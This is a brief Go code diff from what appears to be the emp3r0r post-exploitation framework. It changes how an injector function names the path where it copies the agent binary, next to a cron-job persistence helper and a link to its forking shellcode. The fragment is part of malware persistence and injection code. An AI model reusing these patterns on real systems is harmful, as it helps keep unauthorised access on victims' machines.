@@ -196,7 +196,7 @@ func AddCronJob(job string) error {
 func injector() (err error) {
 	// this shellcode forks a process and executes emp3r0r agent
 	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = Copy(os.Args[0], "[persistence_shellcode_exe]")
+	err = Copy(os.Args[0], GuardianAgentPath)
 	if err != nil {
 		return
 	}
